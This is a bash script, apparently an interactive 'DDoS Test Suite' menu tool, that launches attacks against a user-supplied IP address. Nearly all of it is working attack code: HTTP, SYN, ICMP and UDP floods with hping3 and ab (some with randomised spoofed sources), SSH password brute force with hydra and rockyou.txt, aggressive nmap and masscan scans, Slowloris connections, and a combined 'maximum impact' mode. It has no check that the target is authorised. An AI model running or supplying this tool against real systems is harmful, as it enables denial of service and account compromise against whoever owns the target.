#!/bin/bash

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
PURPLE='\033[0;35m'
NC='\033[0m'

TARGET_IP=""
SSH_USER=""
SSH_USERLIST=""
SSH_PASSLIST="/usr/share/wordlists/rockyou.txt"

if [[ $EUID -ne 0 ]]; then
    echo -e "${RED}Error: This script requires root privileges${NC}"
    echo "Usage: sudo $0"
    exit 1
fi

get_target_config() {
    clear
    echo -e "${CYAN}╔═══════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║    ${PURPLE}Target Configuration${CYAN}               ║${NC}"
    echo -e "${CYAN}║   ${PURPLE}Run this on attacker vm to test${CYAN}     ║${NC}"
    echo -e "${CYAN}╚═══════════════════════════════════════════════════════╝${NC}"
    echo ""
    
    read -p "Enter target IP address: " TARGET_IP
    while [[ ! $TARGET_IP =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; do
        echo -e "${RED}Invalid IP format${NC}"
        read -p "Enter target IP address: " TARGET_IP
    done
    
    echo ""
    echo -e "${YELLOW}SSH Configuration (for brute force attacks):${NC}"
    echo "1. Single username"
    echo "2. Username list file"
    echo "3. Skip SSH configuration"
    read -p "Select SSH user option: " ssh_option
    
    case $ssh_option in
        1)
            read -p "Enter SSH username: " SSH_USER
            ;;
        2)
            read -p "Enter path to username list file: " SSH_USERLIST
            while [[ ! -f "$SSH_USERLIST" ]]; do
                echo -e "${RED}File not found${NC}"
                read -p "Enter path to username list file: " SSH_USERLIST
            done
            ;;
        3)
            SSH_USER=""
            SSH_USERLIST=""
            ;;
    esac
    
    echo ""
    echo -e "${YELLOW}Password List Configuration:${NC}"
    echo "1. Use default (/usr/share/wordlists/rockyou.txt)"
    echo "2. Custom password list file"
    echo "3. Use built-in common passwords"
    read -p "Select password option: " pass_option
    
    case $pass_option in
        1)
            SSH_PASSLIST="/usr/share/wordlists/rockyou.txt"
            if [[ ! -f "$SSH_PASSLIST" ]]; then
                echo -e "${YELLOW}Default rockyou.txt not found, using built-in passwords${NC}"
                SSH_PASSLIST="builtin"
            fi
            ;;
        2)
            read -p "Enter path to password list file: " SSH_PASSLIST
            while [[ ! -f "$SSH_PASSLIST" ]]; do
                echo -e "${RED}File not found${NC}"
                read -p "Enter path to password list file: " SSH_PASSLIST
            done
            ;;
        3)
            SSH_PASSLIST="builtin"
            ;;
    esac
    
    echo ""
    echo -e "${GREEN}Configuration saved:${NC}"
    echo "Target IP: $TARGET_IP"
    [[ -n "$SSH_USER" ]] && echo "SSH User: $SSH_USER"
    [[ -n "$SSH_USERLIST" ]] && echo "SSH User List: $SSH_USERLIST"
    echo "Password List: $SSH_PASSLIST"
    echo ""
    read -p "Press Enter to continue..."
}

show_banner() {
    clear
    echo -e "${CYAN}╔══════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║              ${PURPLE}DDoS Test Suite v2.0${CYAN}               ║${NC}"
    echo -e "${CYAN}║         ${YELLOW}Security Testing Framework${CYAN}          ║${NC}"
    echo -e "${CYAN}╚══════════════════════════════════════════════╝${NC}"
    echo ""
    if [[ -n "$TARGET_IP" ]]; then
        echo -e "${YELLOW}Target: ${TARGET_IP}${NC}"
    else
        echo -e "${RED}Target: Not configured${NC}"
    fi
    echo ""
}

show_menu() {
    echo -e "${BLUE}┌─ Attack Menu ─────────────────────────────────┐${NC}"
    echo -e "${BLUE}│${NC} 1. Configure Target & Credentials             ${BLUE}│${NC}"
    echo -e "${BLUE}│${NC} 2. HTTP Flood Attack                          ${BLUE}│${NC}"
    echo -e "${BLUE}│${NC} 3. SYN Flood Attack                           ${BLUE}│${NC}"
    echo -e "${BLUE}│${NC} 4. ICMP Flood Attack                          ${BLUE}│${NC}"
    echo -e "${BLUE}│${NC} 5. UDP Flood Attack                           ${BLUE}│${NC}"
    echo -e "${BLUE}│${NC} 6. SSH Brute Force Attack                     ${BLUE}│${NC}"
    echo -e "${BLUE}│${NC} 7. Port Scan Attack                           ${BLUE}│${NC}"
    echo -e "${BLUE}│${NC} 8. Slowloris Attack                           ${BLUE}│${NC}"
    echo -e "${BLUE}│${NC} 9. Multi-Layer Combined Attack                ${BLUE}│${NC}"
    echo -e "${BLUE}│${NC} 10. Install Required Tools                    ${BLUE}│${NC}"
    echo -e "${BLUE}│${NC} 0. Exit                                       ${BLUE}│${NC}"
    echo -e "${BLUE}└───────────────────────────────────────────────┘${NC}"
    echo ""
}

check_target() {
    if [[ -z "$TARGET_IP" ]]; then
        echo -e "${RED}Target not configured. Please configure target first (option 1)${NC}"
        read -p "Press Enter to continue..."
        return 1
    fi
    return 0
}

install_tools() {
    echo -e "${YELLOW}Installing required tools...${NC}"
    
    apt update -qq
    apt install -y hping3 nmap hydra apache2-utils curl wget python3 python3-pip masscan sshpass
    
    if ! command -v slowhttptest &> /dev/null; then
        cd /tmp
        git clone https://github.com/shekyan/slowhttptest.git
        cd slowhttptest
        ./configure && make && make install
        cd ..
        rm -rf slowhttptest
    fi
    
    echo -e "${GREEN}Tools installation completed${NC}"
    read -p "Press Enter to continue..."
}

http_flood() {
    check_target || return
    
    echo -e "${YELLOW}HTTP Flood Attack Configuration:${NC}"
    echo "1. Light (100 concurrent, 1000 requests)"
    echo "2. Medium (500 concurrent, 5000 requests)"
    echo "3. Heavy (1000 concurrent, 10000 requests)"
    echo "4. Custom parameters"
    read -p "Select intensity: " intensity
    
    case $intensity in
        1) concurrent=100; requests=1000 ;;
        2) concurrent=500; requests=5000 ;;
        3) concurrent=1000; requests=10000 ;;
        4) 
            read -p "Enter concurrent connections: " concurrent
            read -p "Enter total requests: " requests
            ;;
        *) concurrent=100; requests=1000 ;;
    esac
    
    echo ""
    echo "Target options:"
    echo "1. Root path (/)"
    echo "2. Custom path"
    read -p "Select target path: " path_option
    
    case $path_option in
        1) target_path="/" ;;
        2) 
            read -p "Enter target path (e.g., /admin): " target_path
            [[ ! "$target_path" =~ ^/.* ]] && target_path="/$target_path"
            ;;
        *) target_path="/" ;;
    esac
    
    echo ""
    echo "HTTP method:"
    echo "1. GET"
    echo "2. POST"
    echo "3. Both"
    read -p "Select method: " method_option
    
    echo -e "${CYAN}Launching HTTP flood: $concurrent concurrent, $requests total to $target_path${NC}"
    
    case $method_option in
        1)
            ab -c $concurrent -n $requests http://$TARGET_IP$target_path &
            ;;
        2)
            ab -c $concurrent -n $requests -p /dev/null http://$TARGET_IP$target_path &
            ;;
        3)
            ab -c $((concurrent/2)) -n $((requests/2)) http://$TARGET_IP$target_path &
            ab -c $((concurrent/2)) -n $((requests/2)) -p /dev/null http://$TARGET_IP$target_path &
            ;;
    esac
    
    for i in $(seq 1 20); do
        curl -s http://$TARGET_IP$target_path > /dev/null &
        wget -q http://$TARGET_IP$target_path -O /dev/null &
    done
    
    echo -e "${GREEN}HTTP flood attack launched${NC}"
    read -p "Press Enter to stop and continue..."
    pkill -f "ab -c"
    pkill curl
    pkill wget
}

syn_flood() {
    check_target || return
    
    echo -e "${YELLOW}SYN Flood Attack Configuration:${NC}"
    echo "1. Port 22 (SSH)"
    echo "2. Port 80 (HTTP)"
    echo "3. Port 443 (HTTPS)"
    echo "4. Multiple common ports"
    echo "5. Custom port"
    echo "6. Port range"
    read -p "Select target: " target_option
    
    case $target_option in
        1) ports="22" ;;
        2) ports="80" ;;
        3) ports="443" ;;
        4) ports="22,80,443,21,25,53,110,143,993,995" ;;
        5) 
            read -p "Enter port number: " ports
            ;;
        6)
            read -p "Enter port range (e.g., 1-1000): " ports
            ;;
        *) ports="80" ;;
    esac
    
    echo ""
    echo "Flood intensity:"
    echo "1. Standard flood"
    echo "2. Maximum flood"
    echo "3. Custom rate"
    read -p "Select intensity: " intensity
    
    case $intensity in
        1) flood_params="--flood" ;;
        2) flood_params="--flood --rand-source" ;;
        3) 
            read -p "Enter packets per second (e.g., 1000): " rate
            flood_params="-i u$((1000000/rate))"
            ;;
        *) flood_params="--flood" ;;
    esac
    
    echo -e "${CYAN}Launching SYN flood on ports: $ports${NC}"
    
    if [[ "$ports" == *","* ]]; then
        IFS=',' read -ra PORT_ARRAY <<< "$ports"
        for port in "${PORT_ARRAY[@]}"; do
            hping3 -S -p $port $flood_params $TARGET_IP &
        done
    elif [[ "$ports" == *"-"* ]]; then
        hping3 -S $flood_params $TARGET_IP &
        nmap -sS -p $ports --max-retries 0 --max-scan-delay 0 $TARGET_IP &
    else
        hping3 -S -p $ports $flood_params $TARGET_IP &
    fi
    
    echo -e "${GREEN}SYN flood attack launched${NC}"
    read -p "Press Enter to stop and continue..."
    pkill hping3
    pkill nmap
}

icmp_flood() {
    check_target || return
    
    echo -e "${YELLOW}ICMP Flood Attack Configuration:${NC}"
    echo "1. Standard flood"
    echo "2. Large packet flood (65KB)"
    echo "3. Fragmented packets"
    echo "4. Custom packet size"
    read -p "Select type: " type
    
    case $type in
        1) 
            packet_size=""
            fragment=""
            ;;
        2) 
            packet_size="-d 65500"
            fragment=""
            ;;
        3) 
            packet_size=""
            fragment="-f"
            ;;
        4)
            read -p "Enter packet size in bytes: " size
            packet_size="-d $size"
            fragment=""
            ;;
    esac
    
    echo ""
    echo "Source IP options:"
    echo "1. Real source IP"
    echo "2. Random source IPs"
    read -p "Select source option: " source_option
    
    case $source_option in
        1) source_params="" ;;
        2) source_params="--rand-source" ;;
    esac
    
    echo -e "${CYAN}Launching ICMP flood attack${NC}"
    
    hping3 -1 $packet_size $fragment $source_params --flood $TARGET_IP &
    ping -f $TARGET_IP &
    
    echo -e "${GREEN}ICMP flood attack launched${NC}"
    read -p "Press Enter to stop and continue..."
    pkill hping3
    pkill ping
}

udp_flood() {
    check_target || return
    
    echo -e "${YELLOW}UDP Flood Attack Configuration:${NC}"
    echo "1. Random ports"
    echo "2. Port 53 (DNS)"
    echo "3. Port 123 (NTP)"
    echo "4. Port 161 (SNMP)"
    echo "5. Custom port"
    echo "6. Multiple ports"
    read -p "Select target: " target_option
    
    case $target_option in
        1) ports="" ;;
        2) ports="53" ;;
        3) ports="123" ;;
        4) ports="161" ;;
        5) 
            read -p "Enter port number: " ports
            ;;
        6)
            read -p "Enter comma-separated ports (e.g., 53,123,161): " ports
            ;;
        *) ports="" ;;
    esac
    
    echo ""
    echo "Packet size:"
    echo "1. Standard (64 bytes)"
    echo "2. Large (1024 bytes)"
    echo "3. Maximum (65507 bytes)"
    echo "4. Custom size"
    read -p "Select packet size: " size_option
    
    case $size_option in
        1) packet_size="-d 64" ;;
        2) packet_size="-d 1024" ;;
        3) packet_size="-d 65507" ;;
        4) 
            read -p "Enter packet size in bytes: " size
            packet_size="-d $size"
            ;;
        *) packet_size="-d 64" ;;
    esac
    
    echo -e "${CYAN}Launching UDP flood attack${NC}"
    
    if [[ -n "$ports" && "$ports" == *","* ]]; then
        IFS=',' read -ra PORT_ARRAY <<< "$ports"
        for port in "${PORT_ARRAY[@]}"; do
            hping3 -2 -p $port $packet_size --flood $TARGET_IP &
        done
    elif [[ -n "$ports" ]]; then
        hping3 -2 -p $ports $packet_size --flood $TARGET_IP &
    else
        hping3 -2 $packet_size --flood $TARGET_IP &
    fi
    
    for i in $(seq 1 10); do
        if [[ -n "$ports" ]]; then
            echo | nc -u $TARGET_IP $ports &
        else
            echo | nc -u $TARGET_IP 53 &
            echo | nc -u $TARGET_IP 123 &
        fi
    done
    
    echo -e "${GREEN}UDP flood attack launched${NC}"
    read -p "Press Enter to stop and continue..."
    pkill hping3
    pkill nc
}

ssh_bruteforce() {
    check_target || return
    
    if [[ -z "$SSH_USER" && -z "$SSH_USERLIST" ]]; then
        echo -e "${RED}SSH credentials not configured. Please configure target first (option 1)${NC}"
        read -p "Press Enter to continue..."
        return
    fi
    
    echo -e "${YELLOW}SSH Brute Force Attack Configuration:${NC}"
    echo "1. Quick test (100 attempts)"
    echo "2. Medium test (1000 attempts)"  
    echo "3. Full dictionary attack"
    echo "4. Custom attempt limit"
    read -p "Select intensity: " intensity
    
    case $intensity in
        1) limit=100 ;;
        2) limit=1000 ;;
        3) limit=-1 ;;
        4) 
            read -p "Enter maximum attempts (-1 for unlimited): " limit
            ;;
        *) limit=100 ;;
    esac
    
    echo ""
    echo "Connection options:"
    echo "1. Sequential (slower, stealthier)"
    echo "2. Parallel (faster, more aggressive)"
    read -p "Select method: " method
    
    case $method in
        1) threads=1 ;;
        2) 
            read -p "Enter number of parallel threads (1-16): " threads
            [[ $threads -gt 16 ]] && threads=16
            [[ $threads -lt 1 ]] && threads=1
            ;;
        *) threads=1 ;;
    esac
    
    echo -e "${CYAN}Launching SSH brute force attack${NC}"
    
    if [[ "$SSH_PASSLIST" == "builtin" ]]; then
        echo -e "123456\npassword\nadmin\nroot\n123\npassword123\nqwerty\n12345678\n111111\nabc123" > /tmp/passwords.txt
        passlist_file="/tmp/passwords.txt"
    else
        passlist_file="$SSH_PASSLIST"
    fi
    
    if [[ -n "$SSH_USER" ]]; then
        echo "$SSH_USER" > /tmp/users.txt
        userlist_file="/tmp/users.txt"
    else
        userlist_file="$SSH_USERLIST"
    fi
    
    if command -v hydra &> /dev/null; then
        if [[ $limit -eq -1 ]]; then
            hydra -L "$userlist_file" -P "$passlist_file" -t $threads ssh://$TARGET_IP &
        else
            head -n $limit "$passlist_file" > /tmp/limited_passwords.txt
            hydra -L "$userlist_file" -P /tmp/limited_passwords.txt -t $threads ssh://$TARGET_IP &
        fi
    fi
    
    echo -e "${GREEN}SSH brute force attack launched${NC}"
    read -p "Press Enter to stop and continue..."
    pkill hydra
    rm -f /tmp/users.txt /tmp/passwords.txt /tmp/limited_passwords.txt
}

port_scan() {
    check_target || return
    
    echo -e "${YELLOW}Port Scan Attack Configuration:${NC}"
    echo "1. Quick scan (top 1000 ports)"
    echo "2. Full TCP scan (1-65535)"
    echo "3. UDP scan (top 1000)"
    echo "4. Stealth scan"
    echo "5. Aggressive scan"
    echo "6. Custom port range"
    read -p "Select scan type: " scan_type
    
    case $scan_type in
        1) scan_params="-sS -T4 --top-ports 1000" ;;
        2) scan_params="-sS -T4 -p-" ;;
        3) scan_params="-sU -T4 --top-ports 1000" ;;
        4) scan_params="-sS -T2 -f" ;;
        5) scan_params="-sS -T5 -A" ;;
        6) 
            read -p "Enter port range (e.g., 1-1000): " port_range
            scan_params="-sS -T4 -p $port_range"
            ;;
        *) scan_params="-sS -T4 --top-ports 1000" ;;
    esac
    
    echo ""
    echo "Additional options:"
    echo "1. Standard scan"
    echo "2. Add OS detection"
    echo "3. Add service detection"
    echo "4. Add both OS and service detection"
    read -p "Select options: " options
    
    case $options in
        2) scan_params="$scan_params -O" ;;
        3) scan_params="$scan_params -sV" ;;
        4) scan_params="$scan_params -O -sV" ;;
    esac
    
    echo -e "${CYAN}Launching port scan attack${NC}"
    
    nmap $scan_params $TARGET_IP &
    
    if command -v masscan &> /dev/null; then
        masscan -p1-1000 $TARGET_IP --rate=1000 &
    fi
    
    for port in 22 80 443 21 25 53 110 143; do
        nc -z -w1 $TARGET_IP $port &
    done
    
    echo -e "${GREEN}Port scan attack launched${NC}"
    read -p "Press Enter to stop and continue..."
    pkill nmap
    pkill masscan
    pkill nc
}

slowloris_attack() {
    check_target || return
    
    echo -e "${YELLOW}Slowloris Attack Configuration:${NC}"
    echo "1. Light (100 connections)"
    echo "2. Medium (500 connections)"
    echo "3. Heavy (1000 connections)"
    echo "4. Custom parameters"
    read -p "Select intensity: " intensity
    
    case $intensity in
        1) connections=100; duration=60 ;;
        2) connections=500; duration=120 ;;
        3) connections=1000; duration=180 ;;
        4) 
            read -p "Enter number of connections: " connections
            read -p "Enter duration in seconds: " duration
            ;;
        *) connections=100; duration=60 ;;
    esac
    
    echo ""
    echo "Target options:"
    echo "1. Port 80 (HTTP)"
    echo "2. Port 443 (HTTPS)"
    echo "3. Custom port"
    read -p "Select target port: " port_option
    
    case $port_option in
        1) port=80; protocol="http" ;;
        2) port=443; protocol="https" ;;
        3) 
            read -p "Enter port number: " port
            protocol="http"
            ;;
        *) port=80; protocol="http" ;;
    esac
    
    echo -e "${CYAN}Launching Slowloris attack: $connections connections for $duration seconds${NC}"
    
    if command -v slowhttptest &> /dev/null; then
        slowhttptest -c $connections -H -g -o /tmp/slowloris -i 10 -r 200 -t GET -u $protocol://$TARGET_IP:$port/ -x $duration -p 3 &
    fi
    
    for i in $(seq 1 $((connections/10))); do
        {
            exec 3<>/dev/tcp/$TARGET_IP/$port
            echo -e "GET / HTTP/1.1\r\nHost: $TARGET_IP\r\n" >&3
            sleep $duration
            echo -e "X-a: b\r\n" >&3
            exec 3>&-
        } &
    done
    
    echo -e "${GREEN}Slowloris attack launched${NC}"
    read -p "Press Enter to stop and continue..."
    pkill slowhttptest
    jobs -p | xargs -r kill
}

combined_attack() {
    check_target || return
    
    echo -e "${YELLOW}Multi-Layer Combined Attack Configuration:${NC}"
    echo -e "${RED}WARNING: This launches multiple attacks simultaneously${NC}"
    echo ""
    echo "Select attack components:"
    echo "1. All attacks (maximum impact)"
    echo "2. Network layer only (SYN, ICMP, UDP floods)"
    echo "3. Application layer only (HTTP, Slowloris)"
    echo "4. Custom selection"
    read -p "Select attack suite: " suite
    
    attacks=()
    case $suite in
        1) attacks=("syn" "icmp" "udp" "http" "slowloris" "portscan") ;;
        2) attacks=("syn" "icmp" "udp") ;;
        3) attacks=("http" "slowloris") ;;
        4)
            echo "Available attacks:"
            echo "1. SYN flood"
            echo "2. ICMP flood" 
            echo "3. UDP flood"
            echo "4. HTTP flood"
            echo "5. Slowloris"
            echo "6. Port scan"
            read -p "Enter attack numbers (comma-separated, e.g., 1,2,4): " selection
            IFS=',' read -ra ATTACK_NUMS <<< "$selection"
            for num in "${ATTACK_NUMS[@]}"; do
                case $num in
                    1) attacks+=("syn") ;;
                    2) attacks+=("icmp") ;;
                    3) attacks+=("udp") ;;
                    4) attacks+=("http") ;;
                    5) attacks+=("slowloris") ;;
                    6) attacks+=("portscan") ;;
                esac
            done
            ;;
    esac
    
    echo ""
    read -p "Enter attack duration in seconds (default 30): " duration
    [[ -z "$duration" ]] && duration=30
    
    echo ""
    echo -e "${RED}This will launch ${#attacks[@]} simultaneous attacks for $duration seconds${NC}"
    read -p "Continue? (y/N): " confirm
    
    if [[ ! "$confirm" =~ ^[Yy]$ ]]; then
        return
    fi
    
    echo -e "${CYAN}Launching combined multi-layer attack${NC}"
    
    for attack in "${attacks[@]}"; do
        case $attack in
            "syn")
                hping3 -S -p 80 --flood $TARGET_IP &
                ;;
            "icmp") 
                hping3 -1 --flood $TARGET_IP &
                ;;
            "udp")
                hping3 -2 --flood $TARGET_IP &
                ;;
            "http")
                ab -c 1000 -n 10000 http://$TARGET_IP/ &
                for i in $(seq 1 50); do
                    curl -s http://$TARGET_IP/ > /dev/null &
                done
                ;;
            "slowloris")
                if command -v slowhttptest &> /dev/null; then
                    slowhttptest -c 500 -H -g -o /tmp/combined_slowloris -i 10 -r 200 -t GET -u http://$TARGET_IP/ -x $duration -p 3 &
                fi
                ;;
            "portscan")
                nmap -sS -T5 -p 1-1000 $TARGET_IP &
                ;;
        esac
    done
    
    echo -e "${GREEN}Combined attack launched${NC}"
    echo -e "${RED}Attack running for $duration seconds...${NC}"
    sleep $duration
    
    echo -e "${YELLOW}Stopping all attacks${NC}"
    cleanup
}

cleanup() {
    pkill hping3 2>/dev/null
    pkill ab 2>/dev/null
    pkill curl 2>/dev/null
    pkill wget 2>/dev/null
    pkill nc 2>/dev/null
    pkill nmap 2>/dev/null
    pkill hydra 2>/dev/null
    pkill sshpass 2>/dev/null
    pkill masscan 2>/dev/null
    pkill slowhttptest 2>/dev/null
    jobs -p | xargs -r kill 2>/dev/null
}

trap cleanup EXIT

main_loop() {
    while true; do
        show_banner
        show_menu
        read -p "Select option [0-10]: " choice
        
        case $choice in
            1) get_target_config ;;
            2) http_flood ;;
            3) syn_flood ;;
            4) icmp_flood ;;
            5) udp_flood ;;
            6) ssh_bruteforce ;;
            7) port_scan ;;
            8) slowloris_attack ;;
            9) combined_attack ;;
            10) install_tools ;;
            0) 
                echo -e "${GREEN}Cleaning up and exiting...${NC}"
                cleanup
                exit 0 
                ;;
            *) 
                echo -e "${RED}Invalid option. Please select 0-10.${NC}"
                sleep 1 
                ;;
        esac
    done
}

main_loop
